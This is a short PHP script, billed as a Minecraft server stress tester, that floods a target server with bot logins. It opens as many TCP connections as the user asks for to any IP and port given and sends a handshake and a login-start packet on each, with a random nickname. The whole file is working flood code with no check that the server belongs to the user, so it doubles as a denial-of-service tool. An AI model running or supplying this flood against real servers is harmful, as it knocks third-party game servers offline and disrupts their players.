<?php
/**
 * Simple PHP Minecraft bot flood
 * 
 * This script is used for stress testing Minecraft servers,
 * it can connect a lot of bots very fast.
 * These bots will not respond to any server packets,
 * so they will time out after 30 seconds by default.
 * 
 * @author CreeperMaxCZ <creepermaxcz@gmail.com>
 * 
 * @version 1.0.0
 */


//Check script arguments
$argc == 4 || exit("Usage: php $argv[0] <ip> <port> <count>");

//Minecraft protocol version (47 = 1.8.x, 340 = 1.12.2, 498 = 1.14.4, 754 = 1.16.4 ...)
$proto = 754;

$ip = $argv[1];
$port = intval($argv[2]);
$count = intval($argv[3]);

$sockets = [];

//Make handshake packet
$data = "\x00";
$data .= makeVarInt($proto);
$data .= pack('c', strlen($ip)) . $ip;
$data .= pack('n', $port);
$data .= "\x02";
$handshake = pack('c', strlen($data)) . $data;

for ($i = 1; $i <= $count; $i++) {

    //Generate random nickname
    $nick = bin2hex(openssl_random_pseudo_bytes(5));

    //Create TCP socket
    $socket = @stream_socket_client("tcp://$ip:$port", $errno, $errstr, 10);

    //Check for errors
    if ($errno > 0) {
        echo "ERROR: " . $errstr . PHP_EOL;
        continue;
    }

    $sockets[] = $socket;

    echo "\r[$i/$count] Connecting bot: $nick";

    //Send login handshake packet
    fwrite($socket, $handshake);

    //Make login start packet
    $data = "\x00";
    $data .= pack('c', strlen($nick)) . $nick;
    $data = pack('c', strlen($data)) . $data;

    //Send login start packet
    fwrite($socket,  $data);
}

echo "\rAll $count bots connected, waiting till they drop" . PHP_EOL;

//Wait 33 seconds till all bots are timed out
sleep(33);

function makeVarInt($data) {
    if ($data < 0x80) {
        return pack('C', $data);
    }

    $bytes = [];
    while ($data > 0) {
        $bytes[] = 0x80 | ($data & 0x7f);
        $data >>= 7;
    }

    $bytes[count($bytes)-1] &= 0x7f;

    return call_user_func_array('pack', array_merge(array('C*'), $bytes));
}
